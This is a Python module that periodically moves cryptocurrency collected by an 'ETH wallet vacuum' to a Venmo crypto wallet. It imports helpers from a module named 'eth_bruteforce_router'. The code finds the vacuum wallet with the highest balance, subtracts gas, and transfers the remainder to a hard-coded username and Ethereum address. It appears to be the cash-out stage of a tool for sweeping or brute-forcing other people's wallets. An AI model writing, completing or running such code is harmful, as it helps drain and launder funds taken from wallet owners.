"""
Venmo Wallet Redirect Module

This module provides integration between the ETH wallet vacuum process and Venmo.
It enables funds collected by the wallet vacuum to be redirected to a Venmo crypto wallet.
"""

import os
import logging
import time
from typing import Dict, Any, List, Optional, Tuple

from venmo_integration import (
    get_venmo_integration,
    redirect_funds_to_venmo,
    authenticate_venmo
)

# Import blockchain wallet components
import eth_wallet_vacuum
from secure_wallet_manager import get_wallet_manager
from blockchain_connector import blockchain_connector

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class VenmoWalletRedirect:
    """
    Handles redirection of vacuum funds to Venmo crypto wallet.
    """
    
    def __init__(self):
        """Initialize the Venmo wallet redirection system."""
        self.last_redirect_time = 0
        self.redirect_interval = 86400  # Default: 1 day in seconds
        self.target_venmo_username = os.environ.get('VENMO_TARGET_USERNAME', 'Steven-Schryba')
        self.min_transfer_amount = 0.001  # Minimum ETH to transfer
        self.target_eth_wallet = os.environ.get('VENMO_ETH_WALLET', '0x90bf6B6d71f014fdE4Cc323CdF8B0467BF0fA111')
        self.venmo = get_venmo_integration()
        
        # Set target username in environment if not already set
        if not os.environ.get('VENMO_TARGET_USERNAME'):
            os.environ['VENMO_TARGET_USERNAME'] = self.target_venmo_username
        
    def set_redirect_interval(self, interval_seconds: int) -> None:
        """
        Set the interval between automatic redirects.
        
        Args:
            interval_seconds: Seconds between redirects
        """
        self.redirect_interval = max(3600, interval_seconds)  # Minimum 1 hour
        
    def get_redirect_status(self) -> Dict[str, Any]:
        """
        Get the current status of the Venmo redirection.
        
        Returns:
            Dictionary with status information
        """
        # Check if we're authenticated with Venmo
        authenticated = self.venmo.client is not None
        
        # Get time until next redirect
        time_since_last = int(time.time()) - self.last_redirect_time
        time_until_next = max(0, self.redirect_interval - time_since_last)
        
        # Format time until next redirect
        hours, remainder = divmod(time_until_next, 3600)
        minutes, seconds = divmod(remainder, 60)
        time_until_next_formatted = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
        
        return {
            "authenticated": authenticated,
            "target_venmo_username": self.target_venmo_username or "Not set",
            "last_redirect_time": self.last_redirect_time,
            "next_redirect_in": time_until_next_formatted,
            "min_transfer_amount": self.min_transfer_amount,
            "redirect_interval_seconds": self.redirect_interval
        }
        
    def should_redirect(self) -> bool:
        """
        Check if it's time to redirect funds based on the interval.
        
        Returns:
            bool: True if redirect should occur, False otherwise
        """
        time_since_last = int(time.time()) - self.last_redirect_time
        return time_since_last >= self.redirect_interval
        
    def redirect_vacuumed_funds(self, force: bool = False) -> Dict[str, Any]:
        """
        Redirect funds collected by the wallet vacuum to Venmo.
        
        Args:
            force: Force redirection even if the interval hasn't elapsed
            
        Returns:
            Dictionary with redirection results
        """
        # Check if we should redirect now
        if not force and not self.should_redirect():
            time_until_next = self.redirect_interval - (int(time.time()) - self.last_redirect_time)
            hours, remainder = divmod(time_until_next, 3600)
            minutes, seconds = divmod(remainder, 60)
            time_until_next_formatted = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
            
            return {
                "success": False,
                "error": f"Not time to redirect yet. Next redirect in {time_until_next_formatted}",
                "next_redirect_in": time_until_next_formatted
            }
            
        # Authenticate with Venmo if needed
        if not self.venmo.client:
            if not authenticate_venmo():
                return {
                    "success": False,
                    "error": "Failed to authenticate with Venmo. Check credentials."
                }
                
        # Get vacuum wallets
        wallets = eth_wallet_vacuum.get_vacuum_wallets()
        
        if not wallets or len(wallets) == 0:
            return {
                "success": False,
                "error": "No wallet addresses available for redirection"
            }
            
        # Find vacuum collection wallet with highest balance
        highest_balance = 0
        best_wallet = None
        
        wallet_manager = get_wallet_manager()
        
        for wallet_data in wallets:
            wallet_address = wallet_data.get('address')
            if not wallet_address:
                continue
                
            balance = eth_wallet_vacuum.get_wallet_balance(wallet_address)
            if balance and balance > highest_balance:
                highest_balance = balance
                best_wallet = wallet_address
                
        if not best_wallet or highest_balance < self.min_transfer_amount:
            return {
                "success": False,
                "error": f"No wallet with sufficient balance found. Minimum: {self.min_transfer_amount} ETH",
                "highest_balance": highest_balance
            }
            
        # Get current gas price for ETH network
        from eth_bruteforce_router import get_gas_price_estimates
        gas_estimates = get_gas_price_estimates()
        gas_price = gas_estimates.get('fast', 50) # Default to 50 gwei if no estimate available
        
        # Calculate amount to transfer (subtracting gas cost)
        gas_cost = gas_price * 21000 / 1e9  # Standard ETH transfer is 21000 gas
        transfer_amount = highest_balance - gas_cost
        
        if transfer_amount <= 0:
            return {
                "success": False, 
                "error": "Balance too low to cover gas costs",
                "gas_cost": gas_cost,
                "wallet_balance": highest_balance
            }
            
        # Redirect to Venmo
        redirect_result = redirect_funds_to_venmo(
            amount=transfer_amount,
            source_wallet=best_wallet,
            note="Automated vacuum transfer"
        )
        
        if redirect_result["success"]:
            # Update last redirect time
            self.last_redirect_time = int(time.time())
            
            # Add additional details
            redirect_result.update({
                "wallet_address": best_wallet,
                "original_balance": highest_balance,
                "gas_cost": gas_cost,
                "transfer_amount": transfer_amount,
                "redirect_timestamp": self.last_redirect_time
            })
            
        return redirect_result
            

# Singleton instance
_venmo_wallet_redirect = None

def get_venmo_wallet_redirect() -> VenmoWalletRedirect:
    """
    Get the global VenmoWalletRedirect instance.
    
    Returns:
        The VenmoWalletRedirect singleton instance
    """
    global _venmo_wallet_redirect
    if _venmo_wallet_redirect is None:
        _venmo_wallet_redirect = VenmoWalletRedirect()
    return _venmo_wallet_redirect


def redirect_vacuum_funds_to_venmo(force: bool = False) -> Dict[str, Any]:
    """
    Redirect funds collected by wallet vacuum to Venmo.
    
    Args:
        force: Force redirection even if the interval hasn't elapsed
        
    Returns:
        Dictionary with redirection results
    """
    redirect = get_venmo_wallet_redirect()
    return redirect.redirect_vacuumed_funds(force)


def get_venmo_redirect_status() -> Dict[str, Any]:
    """
    Get the current status of the Venmo redirection.
    
    Returns:
        Dictionary with status information
    """
    redirect = get_venmo_wallet_redirect()
    return redirect.get_redirect_status()


def set_venmo_redirect_interval(hours: int) -> None:
    """
    Set the interval between automatic redirects.
    
    Args:
        hours: Hours between redirects
    """
    redirect = get_venmo_wallet_redirect()
    redirect.set_redirect_interval(hours * 3600)